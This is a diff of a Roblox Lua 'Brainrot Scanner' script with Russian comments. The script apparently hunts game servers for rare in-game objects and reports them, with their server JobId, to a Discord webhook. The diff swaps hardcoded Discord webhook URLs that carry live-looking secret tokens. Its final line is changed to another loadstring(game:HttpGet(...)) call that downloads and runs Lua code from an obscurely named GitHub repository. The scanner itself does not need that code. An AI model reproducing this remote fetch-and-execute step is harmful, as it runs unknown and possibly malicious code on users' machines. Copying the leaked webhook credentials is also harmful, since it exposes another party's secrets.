@@ -8,14 +8,13 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
-local HIGH_PRIORITY_THRESHOLD = 300_000_000 -- 500M/s для особо важных объектов
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo'
+local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1428482450383704148/27tN2Px4cKWy-ei307vNhGhrhIpAenzmGrnPAuRbt8xg6tMYCO-wzDAalNDDaMRZ14PV'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
 -- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
 local OBJECTS = {
-    ['W or L'] = { emoji = '🏆', important = true },
     ['Garama and Madundung'] = { emoji = '🍝', important = true },
     ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
     ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
@@ -24,34 +23,38 @@ local OBJECTS = {
     ['Ketupat Kepat'] = { emoji = '🍏', important = true },
     ['Strawberry Elephant'] = { emoji = '🐘', important = true },
     ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
-    ['Fishino Clownino'] = { emoji = '🤡', important = true },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
     ['Tralaledon'] = { emoji = '🦈', important = true },
+    ['La Extinct Grande'] = { emoji = '🩻', important = true, high_priority = true },
     ['Tictac Sahur'] = { emoji = '🕰️', important = true },
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
     ['Money Money Puggy'] = { emoji = '🐶', important = true }, 
     ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
-    ['Chillin Chili'] = { emoji = '🌶', important = true },
+    ['Chillin Chili'] = { emoji = '🌶', important = true, high_priority = true },
     ['La Secret Combinasion'] = { emoji = '❓', important = true },
     ['Eviledon'] = { emoji = '👹', important = true },
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
     ['La Spooky Grande'] = { emoji = '👻', important = true, high_priority = true },
     ['Meowl'] = { emoji = '🐈', important = true },
-    ['Chipso and Queso'] = { emoji = '🧀', important = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
-    ['Los Tacoritas'] = { emoji = '🚴', important = true },
-    ['Capitano Moby'] = { emoji = '🚢', important = true },
     ['La Taco Combinasion'] = { emoji = '👒', important = true },
+    ['Guest 666'] = { emoji = '㊙️', important = true },
     ['Cooki and Milki'] = { emoji = '🍪', important = true },
     ['Los Puggies'] = { emoji = '🦮', important = true },
+    ['Fragrama and Chocrama'] = { emoji = '🥥', important = true },
+    ['Los Spaghettis'] = { emoji = '🧻', important = true },
+    ['Los Tacoritas'] = { emoji = '🚴', important = true },
     ['Orcaledon'] = { emoji = '🐡', important = true },
-    ['Fragrama and Chocrama'] = { emoji = '🐡', important = true },
-    ['Guest 666'] = { emoji = '㊙️', important = true },
-    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
+    ['Capitano Moby'] = { emoji = '🚢', important = true },
+    ['Esok Sekolah'] = { emoji = '🏠', important = true },
     ['Los Bros'] = { emoji = '📱', important = true },
-    ['Gobblino Unicicжlino'] = { emoji = '🕊', important = true },
+    ['Los Planitos'] = { emoji = '🌍', important = true },
+    ['Lavadorito Spinito'] = { emoji = '📺', important = true },
+    ['W or L'] = { emoji = '🪜', important = true },
+    ['Fishino Clownino'] = { emoji = '🤡', important = true },
+    ['Celularcini Viciosini'] = { emoji = '📱', important = true },
 }
 
 -- Создаем списки важных объектов
@@ -567,4 +570,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/valkiri61-cloud/dsfsdf/refs/heads/main/dfesdf.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrStasGames228/asddsa/refs/heads/main/zahod.lua"))()
